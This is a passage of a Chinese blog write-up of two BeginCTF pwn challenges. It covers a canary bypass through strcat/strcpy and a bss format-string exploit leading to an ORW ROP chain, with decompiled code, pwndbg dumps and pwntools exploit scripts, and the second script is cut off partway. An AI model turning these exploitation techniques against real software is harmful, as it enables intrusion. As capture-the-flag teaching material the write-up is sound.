class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>开了<code>canary</code>但是没开<code>pie</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">checksec pwn        <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token char">'/home/starrysky/beginctf/cat/pwn'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序中有后门函数，<code>main</code>中向<code>bss</code>段两个变量输入数据，<code>vul</code>中向栈中输入数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read1<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read2<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span>read1<span class="token punctuation">,</span> read2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">vul</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>read1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>read2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 read3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-40h] BYREF</span>  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-30h] BYREF</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-28h]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-20h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-8h]</span>  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  read3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  read3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read3<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> read1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> read2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v8 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点就是绕过<code>canary</code>，这里学到一个知识点：<code>strcat</code>会从第一个<code>\x00</code>开始拼接，<code>strcpy</code>会在末尾写<code>\x00</code>，查看栈中数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> stack00:0000│ rsp     0x7fffffffde00 —▸ 0x4041a0 <span class="token punctuation">(</span>cx<span class="token punctuation">)</span> ◂— 0xa616161 /* <span class="token string">'aaa\n'</span> */01:0008│         0x7fffffffde08 —▸ 0x4040a0 <span class="token punctuation">(</span>bx<span class="token punctuation">)</span> ◂— 0xa616161 /* <span class="token string">'aaa\n'</span> */02:0010│         0x7fffffffde10 ◂— 0xa616161 /* <span class="token string">'aaa\n'</span> */03:0018│         0x7fffffffde18 ◂— 0x0<span class="token punctuation">..</span>. ↓            <span class="token number">4</span> skippedpwndbg<span class="token operator">></span> 08:0040│     0x7fffffffde40 —▸ 0x7fffffffdf78 —▸ 0x7fffffffe311 ◂— <span class="token string">'/home/starrysky/beginctf/cat/pwn'</span>09:0048│     0x7fffffffde48 ◂— 0x40934e0df3212f000a:0050│ rbp 0x7fffffffde50 —▸ 0x7fffffffde60 ◂— 0x10b:0058│     0x7fffffffde58 —▸ 0x401381 <span class="token punctuation">(</span>main+183<span class="token punctuation">)</span> ◂— mov eax, <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用：<code>read3</code>覆盖掉<code>dest到canary</code>末尾的<code>\x00</code>，<code>strcat</code>拼接会从<code>canary</code>之后开始拼接，最后利用<code>strcpy</code>将<code>canary</code>末尾恢复成<code>\x00</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">30188</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>cat <span class="token operator">=</span> <span class="token number">0x4011FE</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cat<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">0x39</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="aladdin"><a href="#aladdin" class="headerlink" title="aladdin"></a>aladdin</h2><p>非常…痛苦的一题，本地和远程的偏移竟然不一样…用不了<code>ogg</code>，<code>bss</code>段上的<code>chance=4</code>，只能利用三次，所以这三次要先把<code>chance</code>改掉</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">--</span>chance <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your %d wish:\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>chance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>wish<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> wish<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span>wish<span class="token punctuation">,</span> <span class="token string">"one more wish"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no way!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The wonderful lamp is broken"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看栈结构，利用这几个地址来泄露一些需要的值：<code>code_base、stack、libc_base</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> stack<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp <span class="token number">0x7fffffffdd80</span> ◂— <span class="token number">0x7ffff7fc0005</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│     <span class="token number">0x7fffffffdd88</span> —▸ <span class="token number">0x7fffffffdd90</span> ◂— <span class="token number">0x20</span> <span class="token comment">/* ' ' */</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│     <span class="token number">0x7fffffffdd90</span> ◂— <span class="token number">0x20</span> <span class="token comment">/* ' ' */</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│     <span class="token number">0x7fffffffdd98</span> ◂— <span class="token number">0x3b00010015</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│     <span class="token number">0x7fffffffdda0</span> ◂— <span class="token number">0x10035</span> <span class="token comment">/* '5' */</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│     <span class="token number">0x7fffffffdda8</span> ◂— <span class="token number">0x5000000000006</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│     <span class="token number">0x7fffffffddb0</span> ◂— <span class="token number">0x7fff000000000006</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│     <span class="token number">0x7fffffffddb8</span> ◂— <span class="token number">0x163fe5f2dcc3a00</span>pwndbg<span class="token operator">></span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">0040</span>│ rbp <span class="token number">0x7fffffffddc0</span> ◂— <span class="token number">0x1</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">0048</span>│     <span class="token number">0x7fffffffddc8</span> —▸ <span class="token number">0x7ffff7dbcd90</span> ◂— mov edi<span class="token punctuation">,</span> eax<span class="token number">0</span>a<span class="token operator">:</span><span class="token number">0050</span>│     <span class="token number">0x7fffffffddd0</span> ◂— <span class="token number">0x0</span><span class="token number">0</span>b<span class="token operator">:</span><span class="token number">0058</span>│     <span class="token number">0x7fffffffddd8</span> —▸ <span class="token number">0x555555555229</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— endbr64 <span class="token number">0</span>c<span class="token operator">:</span><span class="token number">0060</span>│     <span class="token number">0x7fffffffdde0</span> ◂— <span class="token number">0x1ffffdec0</span><span class="token number">0</span>d<span class="token operator">:</span><span class="token number">0068</span>│     <span class="token number">0x7fffffffdde8</span> —▸ <span class="token number">0x7fffffffded8</span> —▸ <span class="token number">0x7fffffffe260</span> ◂— '<span class="token operator">/</span>home<span class="token operator">/</span>starrysky<span class="token operator">/</span>game_2024<span class="token operator">/</span>beginctf<span class="token operator">/</span>aladdin<span class="token operator">/</span>pwn'<span class="token number">0</span>e<span class="token operator">:</span><span class="token number">0070</span>│     <span class="token number">0x7fffffffddf0</span> ◂— <span class="token number">0x0</span><span class="token number">0f</span><span class="token operator">:</span><span class="token number">0078</span>│     <span class="token number">0x7fffffffddf8</span> ◂— <span class="token number">0xa251b96a3bc40170</span>pwndbg<span class="token operator">></span> <span class="token number">10</span><span class="token operator">:</span><span class="token number">0080</span>│  <span class="token number">0x7fffffffde00</span> —▸ <span class="token number">0x7fffffffded8</span> —▸ <span class="token number">0x7fffffffe260</span> ◂— '<span class="token operator">/</span>home<span class="token operator">/</span>starrysky<span class="token operator">/</span>game_2024<span class="token operator">/</span>beginctf<span class="token operator">/</span>aladdin<span class="token operator">/</span>pwn'<span class="token number">11</span><span class="token operator">:</span><span class="token number">0088</span>│  <span class="token number">0x7fffffffde08</span> —▸ <span class="token number">0x555555555229</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— endbr64 <span class="token number">12</span><span class="token operator">:</span><span class="token number">0090</span>│  <span class="token number">0x7fffffffde10</span> —▸ <span class="token number">0x555555557d88</span> <span class="token punctuation">(</span>__do_global_dtors_aux_fini_array_entry<span class="token punctuation">)</span> —▸ <span class="token number">0x5555555551e0</span> <span class="token punctuation">(</span>__do_global_dtors_aux<span class="token punctuation">)</span> ◂— endbr64 <span class="token number">13</span><span class="token operator">:</span><span class="token number">0098</span>│  <span class="token number">0x7fffffffde18</span> —▸ <span class="token number">0x7ffff7ffd040</span> <span class="token punctuation">(</span>_rtld_global<span class="token punctuation">)</span> —▸ <span class="token number">0x7ffff7ffe2e0</span> —▸ <span class="token number">0x555555554000</span> ◂— <span class="token number">0x10102464c457f</span><span class="token number">14</span><span class="token operator">:</span><span class="token number">00</span>a0│  <span class="token number">0x7fffffffde20</span> ◂— <span class="token number">0x5dae469580660170</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">00</span>a8│  <span class="token number">0x7fffffffde28</span> ◂— <span class="token number">0x5dae56dda14e0170</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">00</span>b0│  <span class="token number">0x7fffffffde30</span> ◂— <span class="token number">0x7fff00000000</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">00</span>b8│  <span class="token number">0x7fffffffde38</span> ◂— <span class="token number">0x0</span>pwndbg<span class="token operator">></span> <span class="token number">18</span><span class="token operator">:</span><span class="token number">00</span>c0│  <span class="token number">0x7fffffffde40</span> ◂— <span class="token number">0x0</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ↓     <span class="token number">2</span> skipped<span class="token number">1</span>b<span class="token operator">:</span><span class="token number">00</span>d8│  <span class="token number">0x7fffffffde58</span> ◂— <span class="token number">0x163fe5f2dcc3a00</span><span class="token number">1</span>c<span class="token operator">:</span><span class="token number">00e0</span>│  <span class="token number">0x7fffffffde60</span> ◂— <span class="token number">0x0</span><span class="token number">1</span>d<span class="token operator">:</span><span class="token number">00e8</span>│  <span class="token number">0x7fffffffde68</span> —▸ <span class="token number">0x7ffff7dbce40</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">)</span> ◂— mov r15<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0x1ef159</span><span class="token punctuation">]</span><span class="token number">1</span>e<span class="token operator">:</span><span class="token number">00f</span><span class="token number">0</span>│  <span class="token number">0x7fffffffde70</span> —▸ <span class="token number">0x7fffffffdee8</span> —▸ <span class="token number">0x7fffffffe28f</span> ◂— <span class="token char">'GJS_DEBUG_TOPICS=JS ERROR;JS LOG'</span><span class="token number">1f</span><span class="token operator">:</span><span class="token number">00f</span><span class="token number">8</span>│  <span class="token number">0x7fffffffde78</span> —▸ <span class="token number">0x555555557d88</span> <span class="token punctuation">(</span>__do_global_dtors_aux_fini_array_entry<span class="token punctuation">)</span> —▸ <span class="token number">0x5555555551e0</span> <span class="token punctuation">(</span>__do_global_dtors_aux<span class="token punctuation">)</span> ◂— endbr64 pwndbg<span class="token operator">></span> fmtarg <span class="token number">0x7fffffffddd8</span>The index of format argument <span class="token operator">:</span> <span class="token number">17</span> <span class="token punctuation">(</span><span class="token string">"\%16$p"</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> fmtarg <span class="token number">0x7fffffffde00</span>The index of format argument <span class="token operator">:</span> <span class="token number">22</span> <span class="token punctuation">(</span><span class="token string">"\%21$p"</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> fmtarg <span class="token number">0x7fffffffde68</span>The index of format argument <span class="token operator">:</span> <span class="token number">35</span> <span class="token punctuation">(</span><span class="token string">"\%34$p"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入的<code>wish</code>是<code>bss</code>段的，也就是非栈上的格式化字符串，需要用栈作为跳板去改其他地方的数据，本题的利用思路就是第一次输入用于泄露地址，第二次输入用来设置跳板，第三次输入用来改<code>printf</code>返回地址到<code>val</code>中的输入，继续输入改<code>chance</code>值，但也不能改太大，用到的链如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x7fffffffdde8 —▸ 0x7fffffffded8 —▸ 0x7fffffffe260 ◂— <span class="token string">'/home/starrysky/game_2024/beginctf/aladdin/pwn'</span>0x7fffffffde70 —▸ 0x7fffffffdee8 —▸ 0x7fffffffe28f ◂— <span class="token string">'GJS_DEBUG_TOPICS=JS ERROR;JS LOG'</span>pwndbg<span class="token operator">></span> fmtarg 0x7fffffffdde8The index of <span class="token function">format</span> argument <span class="token builtin class-name">:</span> <span class="token number">19</span> <span class="token punctuation">(</span><span class="token string">"\%18<span class="token variable">$p</span>"</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> fmtarg 0x7fffffffde70The index of <span class="token function">format</span> argument <span class="token builtin class-name">:</span> <span class="token number">36</span> <span class="token punctuation">(</span><span class="token string">"\%35<span class="token variable">$p</span>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改成功后就可以无限利用<code>fmt</code>，但这题有沙箱，只能<code>orw</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aladdin  seccomp-tools dump ./pwn                  line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0001: 0x15 0x01 0x00 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execve<span class="token punctuation">)</span> goto 0003 0002: 0x35 0x01 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">>=</span> 0x0<span class="token punctuation">)</span> goto 0004 0003: 0x06 0x00 0x00 0x00050000  <span class="token builtin class-name">return</span> ERRNO<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 0004: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是把栈直接改<code>orw</code>比较麻烦，所以可以在返回地址先构造<code>read</code>，然后用<code>read</code>读<code>rop</code>链实现<code>orw</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">30879</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pay</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    tar <span class="token operator">=</span> target <span class="token operator">&amp;</span> <span class="token number">0xffff</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        val <span class="token operator">=</span> value <span class="token operator">&amp;</span> <span class="token number">0xffff</span>        value <span class="token operator">=</span> value <span class="token operator">>></span> <span class="token number">16</span>        p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>tar<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        tar <span class="token operator">+=</span> <span class="token number">0x2</span>p <span class="token operator">=</span> <span class="token string">b'%17$p%22$p%35$p'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1229</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x29e40</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token 